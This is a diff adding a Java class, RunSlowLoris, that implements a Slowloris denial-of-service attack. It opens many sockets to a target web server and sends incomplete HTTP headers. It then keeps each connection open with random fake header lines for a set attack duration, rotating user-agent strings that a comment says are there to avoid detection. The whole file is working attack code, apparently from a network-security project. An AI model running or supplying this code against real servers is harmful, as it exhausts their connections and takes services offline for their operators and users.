@@ -1,0 +1,124 @@
+import java.io.IOException;
+import java.net.*;
+import java.util.Arrays;
+import java.util.Random;
+
+public class RunSlowLoris implements Runnable{
+
+    int port;
+    String target;
+    int attackTimer;
+    int executorId;
+
+    private URL targetURL;
+    private Socket[] socketConnections = new Socket[NetSecPortUtil.numConnections];
+    private String[] partialConnectionRequests;
+
+    public RunSlowLoris(String targetIP, int port, int attackTimer, int executorId) throws IOException {
+        this.target = targetIP;
+        this.port = port;
+        this.attackTimer = attackTimer;
+        this.executorId = executorId;
+
+        String targetPrefix = target.startsWith("http://") ? "" : "http://";
+        targetURL = new URL(targetPrefix + target);
+        partialConnectionRequests = createPartialHTTPRequests();
+
+        for(int i = 0; i < NetSecPortUtil.numConnections; i++)
+            startConnections(i);
+    }
+
+    private String[] createPartialHTTPRequests() {
+        String connectingString = "/";
+        if(targetURL.getPath().startsWith("/"))
+            connectingString = "";
+
+
+        //Build HTTP header
+        String type = "GET " + connectingString + targetURL.getPath() + " HTTP/1.1\r\n";
+        String host = "Host: " + targetURL.getHost() + (port == 80 ? "" : ":" + port) + "\r\n";
+        String contentType = "Content-Type: */* \r\n";
+        String connection = "Connection: keep-alive\r\n";
+
+        //Agent strings, different to avoid detection. Source: Connor-F: Github
+        String[] agents = {
+                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
+                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
+                "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.0.9) Gecko/2009040821",
+                "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
+                "Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:2.0b4) Gecko/20100818",
+                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
+                "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
+                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
+                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
+                "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
+                "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
+                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
+                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36"
+        };
+
+        String[] partialConnections = new String[NetSecPortUtil.numConnections];
+        for(int i = 0; i < NetSecPortUtil.numConnections; i++)
+            partialConnections[i] = type + host + contentType + connection + agents[new Random().nextInt(agents.length)] + "\r\n";
+
+        return partialConnections;
+    }
+
+    private void startConnections(int index) throws IOException {
+        System.out.println("Connector: " + toString() + " Connecting to: " + index);
+        socketConnections[index] = new Socket(InetAddress.getByName(targetURL.toExternalForm().replace("http://", "")), port);
+    }
+
+    @Override
+    public void run() {
+        long startTime = System.currentTimeMillis();
+
+        for (int i = 0; i < NetSecPortUtil.numConnections; i++){
+            System.out.println("Connector: " + toString() + " Sending Request: " + i);
+            try {
+                sendFalseHeaderField(i);
+                Thread.sleep(new Random().nextInt(3500));
+            } catch (IOException | InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
+
+        while((System.currentTimeMillis() - startTime) < (attackTimer * 60 * 1000)) {
+            try {
+                attack();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+    private void attack() throws IOException {
+        for (int i = 0; i < NetSecPortUtil.numConnections; i++) {
+            sendBogusRequestHeader(i);
+
+            try {
+                Thread.sleep(new Random().nextInt(3500));
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+    private void sendBogusRequestHeader(int index) throws IOException {
+        socketConnections[index].getOutputStream().write(partialConnectionRequests[new Random().nextInt(NetSecPortUtil.numConnections)].getBytes());
+    }
+
+    private void sendFalseHeaderField(int index) throws IOException {
+        char[] randomChars = "QHJOOJEROPZPXBXNBXCIYQWOYWOYTGWSEDKRMPAPFPETQPEYOQWPENGP".toCharArray();
+        String fakeData = randomChars[new Random().nextInt(randomChars.length)] + "-" + randomChars[new Random().nextInt(randomChars.length)] + ": " + new Random().nextInt() + "\r\n";
+
+        socketConnections[index].getOutputStream().write(fakeData.getBytes());
+    }
+
+    @Override
+    public String toString() {
+        return "RunSlowLoris{" + "port=" + port + ", target='" + target + '\'' + ", attackTimer=" + attackTimer + ", thread=" + executorId + "}";
+    }
+}
